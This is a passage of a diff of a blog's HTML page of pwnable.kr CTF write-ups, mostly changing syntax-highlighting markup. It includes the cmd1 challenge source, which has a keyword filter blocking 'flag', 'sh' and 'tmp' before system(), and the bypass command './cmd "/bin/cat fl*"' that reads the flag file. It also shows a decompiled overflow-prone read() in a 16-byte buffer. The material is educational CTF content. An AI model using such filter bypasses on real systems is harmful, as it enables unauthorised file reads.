-</span></span><span class="line"><span class="cl">                                <span class="n">help</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                                <span class="nf">help</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">                                <span class="k">break</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">                        <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">                                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;bye</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;bye</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">                        <span class="k">default</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">                                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;invalid menu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;invalid menu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                                <span class="k">break</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">                <span class="p">}</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
@@ -1972,8 +1971,8 @@
 </span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="14-cmd1">14 cmd1</h2>
-<div class="highlight"><div class="chroma">
+</div><h2 id="14-cmd1" class="headerLink">
+    <a href="#14-cmd1" class="header-mark"></a>14 cmd1</h2><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1999,16 +1998,16 @@
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>  
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">filter</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">cmd</span><span class="p">){</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">r</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;flag&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;sh&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;tmp&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">+=</span> <span class="nf">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;flag&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">+=</span> <span class="nf">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;sh&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">+=</span> <span class="nf">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;tmp&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">r</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">**</span> <span class="n">envp</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">        <span class="n">putenv</span><span class="p">(</span><span class="s">&#34;PATH=/thankyouverymuch&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">filter</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">putenv</span><span class="p">(</span><span class="s">&#34;PATH=/thankyouverymuch&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
@@ -2027,10 +2026,10 @@
 <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">./cmd &#34;/bin/cat fl*&#34;
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="15-cmd2">15 cmd2</h2>
-<p>没做呢</p>
-<h2 id="16-uaf">16 uaf</h2>
-<p>use after free漏洞
+</div><h2 id="15-cmd2" class="headerLink">
+    <a href="#15-cmd2" class="header-mark"></a>15 cmd2</h2><p>没做呢</p>
+<h2 id="16-uaf" class="headerLink">
+    <a href="#16-uaf" class="header-mark"></a>16 uaf</h2><p>use after free漏洞
 源码:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2192,8 +2191,8 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="unexploitable">unexploitable</h3>
-<div class="highlight"><div class="chroma">
+</div><h3 id="unexploitable" class="headerLink">
+    <a href="#unexploitable" class="header-mark"></a>unexploitable</h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -2206,8 +2205,8 @@
 <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">sleep</span><span class="p">(</span><span class="mi">3u</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x50FuLL</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">sleep</span><span class="p">(</span><span class="mi">3u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x50FuLL</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
@@ -2224,7 +2223,7 @@
             </div></div>
         <div class="post-info-line">
             <div class="post-info-md"><span>
-                            <a class="link-to-markdown" href="/pwnable.kr/index.md" target="_blank">Read Markdown</a>
+                            <a class="link-to-markdown" href="/pwnable.kr/index.md" target="_blank">Read markdown</a>
                         </span></div>
             <div class="post-info-share">
                 <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://juicymio.github.io/pwnable.kr/" data-title="Pwnable.kr" data-hashtags="pwn"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://juicymio.github.io/pwnable.kr/" data-hashtag="pwn"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://juicymio.github.io/pwnable.kr/" data-title="Pwnable.kr" data-web><i class="fab fa-whatsapp fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://juicymio.github.io/pwnable.kr/" data-title="Pwnable.kr"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://juicymio.github.io/pwnable.kr/" data-title="Pwnable.kr"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="http://juicymio.github.io/pwnable.kr/" data-title="Pwnable.kr" data-description=""><i class="fab fa-blogger fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="http://juicymio.github.io/pwnable.kr/" data-title="Pwnable.kr"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
@@ -2244,7 +2243,7 @@
 </div>
 <div id="comments"></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.104.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+        <div class="footer-container"><div class="footer-line">
                 </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">JuicyMio</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
